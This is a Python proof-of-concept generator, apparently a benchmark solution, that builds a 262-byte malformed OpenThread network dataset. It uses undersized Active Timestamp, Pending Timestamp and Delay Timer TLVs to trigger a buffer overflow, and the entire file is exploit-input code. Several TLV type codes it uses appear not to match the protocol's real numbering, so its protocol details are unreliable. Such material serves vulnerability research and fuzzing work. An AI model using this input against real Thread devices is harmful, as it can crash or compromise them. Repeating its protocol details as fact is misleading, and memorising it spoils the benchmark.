import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Based on the vulnerability description, we need to craft TLVs with insufficient length
        # for Active/Pending Timestamp and Delay Timer TLVs
        
        # Create a dataset with invalid TLVs that will trigger the buffer overflow
        # The ground truth length is 262 bytes, so we'll create something shorter but still effective
        
        # Dataset format (OpenThread Commissioner/Joiner Dataset):
        # - Network Name TLV (required)
        # - Extended PAN ID TLV (required)  
        # - Network Master Key TLV (required)
        # - Mesh Local Prefix TLV (required)
        # - Active Timestamp TLV (vulnerable)
        # - Pending Timestamp TLV (vulnerable)
        # - Delay Timer TLV (vulnerable)
        
        # Build minimum valid dataset first
        poc = bytearray()
        
        # 1. Network Name TLV (Type 0x00)
        # Format: Type(1) + Length(1) + Value(variable)
        network_name = b"TestNetwork"
        poc.extend(bytes([0x00, len(network_name)]))
        poc.extend(network_name)
        
        # 2. Extended PAN ID TLV (Type 0x01)
        # Value: 8 bytes
        ext_pan_id = b"\x01\x02\x03\x04\x05\x06\x07\x08"
        poc.extend(bytes([0x01, len(ext_pan_id)]))
        poc.extend(ext_pan_id)
        
        # 3. Network Master Key TLV (Type 0x02)  
        # Value: 16 bytes
        master_key = b"\x00" * 16
        poc.extend(bytes([0x02, len(master_key)]))
        poc.extend(master_key)
        
        # 4. Mesh Local Prefix TLV (Type 0x03)
        # Value: 8 bytes
        mesh_prefix = b"\xfd\x00" + b"\x00" * 6
        poc.extend(bytes([0x03, len(mesh_prefix)]))
        poc.extend(mesh_prefix)
        
        # 5. Active Timestamp TLV (Type 0x07) - VULNERABLE
        # Minimum valid length should be 10 bytes (8 timestamp + 2 uint16)
        # But we provide insufficient length to trigger overflow
        # Type: 0x07, Length: 1 (insufficient), Value: single byte
        poc.extend(bytes([0x07, 1]))  # Length of 1 is insufficient
        poc.extend(b"\x01")  # Only 1 byte instead of at least 10
        
        # 6. Pending Timestamp TLV (Type 0x08) - VULNERABLE
        # Same vulnerability, insufficient length
        poc.extend(bytes([0x08, 1]))  # Length of 1 is insufficient
        poc.extend(b"\x02")  # Only 1 byte instead of at least 10
        
        # 7. Delay Timer TLV (Type 0x09) - VULNERABLE
        # Minimum valid length should be 4 bytes (uint32)
        # Provide insufficient length
        poc.extend(bytes([0x09, 1]))  # Length of 1 is insufficient
        poc.extend(b"\x03")  # Only 1 byte instead of at least 4
        
        # Pad to get closer to ground truth length while staying efficient
        current_len = len(poc)
        if current_len < 262:
            # Add padding to reach target length while keeping vulnerability
            padding_needed = 262 - current_len
            # Add Channel TLV (Type 0x04) as padding
            poc.extend(bytes([0x04, 3]))  # Channel TLV: 3 bytes
            poc.extend(b"\x0b\x00\x00")  # Channel 11
            
            # Add more padding if needed with PAN ID TLV (Type 0x05)
            remaining = 262 - len(poc)
            if remaining > 0:
                poc.extend(bytes([0x05, 2]))  # PAN ID TLV: 2 bytes
                poc.extend(b"\x34\x12")  # PAN ID 0x1234
                # Fill any remaining bytes with zeros
                remaining = 262 - len(poc)
                if remaining > 0:
                    poc.extend(b"\x00" * remaining)
        
        # Ensure exact length
        return bytes(poc[:262])